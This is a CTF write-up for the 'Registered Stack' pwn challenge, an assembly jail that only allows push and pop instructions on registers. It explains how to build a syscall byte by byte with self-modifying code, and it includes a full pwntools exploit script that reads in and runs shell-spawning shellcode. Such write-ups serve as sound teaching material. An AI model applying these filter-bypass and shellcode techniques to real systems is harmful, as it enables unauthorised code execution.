# Registered Stack

**CTF:** Srdnlen CTF 2026 Quals\
**Category:** pwn\
**Difficulty:** medium\
**Authors:** @church (Matteo Chiesa)

## Description

> Welcome to the Kingdom of Registered Stack!
In this realm, you can only operate with the Stack, and everything must be Registered.\
How can i call this? CJail? ASMJail? But above all, is it Turing-complete?

## Overview

This pwn challenge comes with the dockerfile that loads the libc version `2.39-0ubuntu8.7`, and with the `libcapstone.so.4`.

It is a jail in assembly code. The program asks for a hex string of assembled bytecode. Then it validates the code sent, letting pass only *push* and *pop* instructions which have a register as argument, otherwise the program stops. If the code is valid, it's been executed.

## Solution

This challenge can be surely solved using various solutions.
Here I will expose the process I have followed to resolve this challenge myself.

The goal is this challenge is to execute an *execve* syscall, and to do it I have thought about doing a *read* syscall, that consent me to write some other unvalidated code to execute the actual shellcode.
So I have to create a self-modifying code, valid for the program, that will do that *read* syscall. To make this I ran into several problems.

### Initial situation

Based on what the challenge do, seems I am stuck to work with only the values that are in the stack and in the registers at the moment my code starts its execution. But we can easily verify that all the registers are cleaned up before, with the only exceptions in *RIP* (that must points to the code executing) and *RSP*, which points also to the start of the *RWX* segment.

### Possible instructions

I need to understand how I can produce useful values different from the ones in the registers at the start. I cannot use any immediate number in the code, but I can pop a value from the mmaped memory, if disassembled is valid code. I need a list of every valid instruction, to see if some of their values are useful. I wrote a small script that dumps all the valid instructions.

```py
import pwn
pwn.context.arch = "amd64"

for inst in ["pop", "push"]:
    for reg in [
        "rax",
        "rbx",
        "rcx",
        "rdx",
        "rsi",
        "rdi",
        "r8",
        "r9",
        "r10",
        "r11",
        "r12",
        "r13",
        "r14",
        "r15",
        "rbp",
        "rsp",
        "ax",
        "bx",
        "cx",
        "dx",
        "si",
        "di",
        "bp",
        "sp",
        "fs",
        "gs",
    ]:
        try:
            asm = pwn.asm(f"{inst} {reg}")
            print(f"{inst} {reg}: '{asm.hex()}'")
        except Exception:
            print(f"No {inst} {reg}")
```

Among all of them, I searched for two particular values, `0x05` and `0x0f`, which are the bytes that form the *syscall* instruction.
The `0x0f` is part of the instructions containing the registers *FS* and *GS*. I can write one of those instructions in memory as code, and then pop its value in a register to have that byte. I cannot executing `pop fs` or `pop gs`, because those are special register, but I can push them.
For the `0x05` byte I can't say the same. I need to produce this value in another way

### Arithmetic operations

A way to produce a specific value is starting from a possible value, and do some operation on it to tranform it in the one I need. But can I do in the environment, with only push and pop instruction?

Well, yes! On any valid instruction, there is a register that is incremented and decremented, which is *RSP*. When it is the value I want, I can push it, and then pop its value to another register to save it.

I can work only with the 8-bytes and the 2-bytes registers, so I can only sum 2 or 8 to *RSP*, keeping it at an even value. This is a bit concerning, because I cannot create the `0x05` byte only with this, since it is odd. So first I need to pop into *RSP* the `0x0f` byte (which is odd), then I can decrement *RSP* until `0x05` is reached.

### Memory layout

Now that I know how I can produce the values I need for the *syscall* instruction, I have to understand how to manage the stack and the code space. 
This is not trivial. I need *RSP* to be near enough the code, so I can pop bytes from some instruction values. But I need to careful; if I push anything when the stack pointer too close under the instruction pointer, I will override the code I'm executing, almost surely killing the program.

To work, it is better to have the stack before the code, because in that region I can push and pop values without messing up with the code executing.
To do so, I came up with a trick: at the start, I can pop and push the same register. Even if it will override the code that is executing, it will be overwritten with itself, so the flow is untouched, and I kept *RSP* less than *RIP*.

To switch the *RSP* to odd values I have choosen `push fs`, because it is composed of *0fa0* (`0xa00f`). When I pop this exact value in *SP*, if the 4th less-significant nibble of the mmaped address is `a` (1/16 odds), this register will point to the start of the allocated page.

### Construct the *syscall* instruction

After I saved in a register the `0xa00f` and `0xa005` values, I need to put them together.
To do this, I can push `0xa00f`, come back to even *RSP* value, push `0xa00f` overriding the higher byte of `0xa00f`, and at the end return to an odd stack value, so I can pop the value `0x050f` in the *RDX* register to save it. Now I can push it in the right place to be executed.

### Build the *read* syscall

To execute the *read* syscall, I need a pointer to a part of the code that is going to be executed after. To do so, I can execute a bunch of pops, so that the *RSP* overtakes the *RIP*. At that point, I can push *RSP* and pop its value in the *RSI* register, to get an address where the execution of the program is going to arrive. This will be the location where I will write the actual shellcode.

Then I have to restore the instructions immediately before when the stack pointer is now (because the code is been override by some of these instrucitons).
The last part is to push the *RDX* register, so the program will execute the *syscall* instruction.

### Exploit

At the *read* syscall I can simply write a standard shellcode, keeping in mind the fragility of the stack manipulation. Also when the shellcode is executed, it's better to have the stack pointer less that the instruction pointer.

In the exploitation I have used the *RBP* and *BP* registers in the instructions I used for only padding or to just move the stack pointer. In *BX* and *CX* I have saved an even and an odd value of valid stack pointer, to use when I have to switch from one to the other. In *DX* I have saved the bytes of *syscall* instruction, that during the *read* are also the length of the read operation. In *RSI* I have saved the pointer where the shellcode will be written, and then executed. In *R8* are saved bytes of legal instruction, which execution does not mess up the stack pointer nor the execution flow.

```py
def pop(reg: str):
    return f"pop {reg}"

def push(reg: str):
    return f"push {reg}"


# Stack upon code, because i can modify the code already executed
# This exploit needs mmap & 0xf000 == 0xa000

# RBP: used in legal executable instruction for padding
# BX: valid even SP
# CX: valid odd SP
# DX: 0x050f == b"\x0f\x05" (syscall)
# RSI: mmap reference
# R8: bytes of legal executable instructions

code = [
    *[pop("rbp"), push("rbp")]*(0x8 // 2), # trick to increase rip keeping rsp where it is without messing up the execution
    pop("r8"), # 2-byte inst of 8-byte reg, store byte of legal instrution
    push("fs"), # store 0xa00f at 0xa00a

    pop("rbp"), # SP = 0xa008

    push("sp"),
    pop("bx"), # BX = 0xa008

    pop("bp"), # skip pop r8 bytes
    pop("sp"), # SP = 0xa00f

    push("sp"),
    pop("cx"), # CX = 0xa00f

    *[push("bp")]*(0xa // 2), # SP = 0xa005

    push("sp"),
    pop("dx"), # DX = 0xa005

    pop("bp"), # SP = 0xa007
    push("cx"), # store 0x0f at 0xa005

    push("bx"),
    pop("sp"), # SP = 0xa008

    push("dx"), # store 0x05 at 0xa006

    pop("bp"), # SP = 0xa008
    pop("bp"), # SP = 0xa00a
    push("dx"),
    pop("sp"), # SP = 0xa005
    pop("dx"), # DX = 0x050f == b"\x0f\x05" (syscall), SP = 0xa007, RIP = 0xa03b

    *[pop("rbp")]*(0x50 // 8), # move RSP under the code, SP = 0xa057

    push("rsp"),
    pop("rsi"), # SI = 0xa057 (here I will write my shellcode)

    push("dx"), # put syscall ready to be executed, SP = 0xa055
    push("r8"), # restore legal executable instructions above 0xa055
    push("r8"), # restore legal executable instructions above 0xa04d
]
payload1 = pwn.asm("\n".join(code))
print(hex(len(payload1)))
payload1 = payload1.ljust(0xf7, pwn.asm(pop("rbp")))

io.sendlineafter(b"> ", payload1.hex().encode())

io.sendline(pwn.asm(pwn.shellcraft.sh()))

io.interactive()
```

**srdnlen{Pu5h1n6_4nd_P0pp1n6_6av3_m3_4_h34d4ch3}**
